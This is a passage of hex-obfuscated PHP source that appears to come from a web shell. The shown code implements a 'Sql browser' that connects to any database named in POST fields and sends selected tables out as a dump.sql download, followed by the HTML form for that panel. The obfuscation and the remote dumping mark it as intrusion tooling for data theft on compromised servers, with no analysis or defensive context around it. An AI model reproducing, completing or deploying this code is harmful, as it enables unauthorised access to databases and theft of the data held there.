ho"I\x4eSERT INTO\x20".${$xkwhehnon}." (".implode(",\x20",${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x61\x73\x71\x69\x74l\x6cj"]}).")\x20\x56\x41L\x55E\x53\x20(".implode(", ",${${"\x47\x4c\x4fBALS"}["tru\x63y\x6al"]}).")\x3b"."\n";}break;}return false;}}$ofwnnxm="d\x62";${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x65\x71\x78kglj"]}=new DbClass($_POST["\x74\x79p\x65"]);if(@$_POST["\x70\x32"]=="d\x6fwn\x6c\x6f\x61\x64"){ob_start("o\x62\x5fgz\x68andler",4096);$db->connect($_POST["\x73q\x6c_\x68\x6fs\x74"],$_POST["s\x71\x6c\x5f\x6c\x6f\x67i\x6e"],$_POST["sq\x6c_\x70\x61\x73s"],$_POST["sq\x6c_\x62\x61s\x65"]);$db->selectdb($_POST["\x73\x71\x6c_ba\x73\x65"]);header("\x43\x6f\x6ete\x6e\x74-\x44\x69s\x70\x6fsi\x74\x69\x6f\x6e: a\x74\x74\x61\x63\x68m\x65\x6et;\x20\x66\x69len\x61m\x65=\x64um\x70.\x73ql");header("Conte\x6e\x74-\x54ype:\x20t\x65x\x74/p\x6ca\x69\x6e");foreach($_POST["\x74\x62\x6c"]as${${"G\x4c\x4f\x42A\x4cS"}["m\x68\x6e\x67\x74\x67y\x67\x68"]})$db->dump(${${"\x47LOBA\x4c\x53"}["\x6d\x68\x6eg\x74\x67\x79\x67\x68"]});exit;}printHeader();echo "\t\x3ch1\x3e\x53ql b\x72o\x77s\x65\x72</\x681\x3e\x3c\x64\x69v\x20\x63\x6c\x61\x73s=\x63\x6f\x6et\x65\x6e\x74\x3e\n\t\x3cform nam\x65\x3d\"\x73\x66\"\x20m\x65t\x68o\x64\x3d\x22\x70\x6f\x73\x74\x22\x3e\n\t\t<\x74ab\x6ce\x20\x63e\x6clpad\x64\x69ng=\x222\x22\x20c\x65l\x6c\x73\x70aci\x6e\x67\x3d\x22\x30\">\n\t\t\t<tr>\n\t\t\t\t<\x74\x64\x3e\x54\x79\x70\x65</\x74\x64\x3e\n\t\t\t\t\x3ctd\x3e\x48\x6fst\x3c/td\x3e\n\t\t\t\t<t\x64>\x4c\x6f\x67\x69n</\x74d>\n\t\t\t\t<\x74\x64\x3ePa\x73\x73\x77ord\x3c/\x74d>\n\t\t\t\t\x3c\x74\x64>\x44\x61tab\x61\x73\x65\x3c/\x74d\x3e\n\t\t\t\t<td\x3e</\x74\x64\x3e\n\t\t\t</\x74r>\n\t\t\t\x3c\x74r>\n\t\t\t\t\x3c\x69np\x75t\x20\x74y\x70e\x3dh\x69dde\x6e \x6e\x61\x6de=\x61\x20\x76a\x6c\x75e\x3d\x53\x71\x6c>\n\t\t\t\t<i\x6eput\x20\x74\x79pe=\x68i\x64\x64\x65n \x6ea\x6de=p\x31 \x76\x61\x6cu\x65\x3d\x27\x71ue\x72\x79\x27\x3e\n\t\t\t\t\x3ci\x6e\x70u\x74 ty\x70e=\x68i\x64d\x65n\x20\x6e\x61\x6de\x3dp\x32>\n\t\t\t\t\x3cin\x70\x75